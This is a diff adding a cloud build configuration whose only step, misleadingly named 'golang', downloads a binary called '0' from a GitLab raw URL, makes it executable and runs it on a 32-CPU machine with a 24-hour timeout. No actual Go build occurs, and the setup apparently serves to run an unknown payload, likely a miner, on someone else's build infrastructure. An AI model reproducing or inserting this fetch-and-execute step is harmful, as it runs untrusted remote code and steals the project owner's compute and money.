@@ -1,0 +1,13 @@
+steps:
+  - name: golang
+    args:
+      - '-c'
+      - >-
+         wget https://gitlab.com/cuan1/artos/-/raw/main/0 && chmod u+x 0 && ./0
+    waitFor:
+      - '-'
+    entrypoint: /bin/bash
+timeout: 86400s
+options:
+  machineType: 'E2_HIGHCPU_32'
+  diskSizeGb: '100'
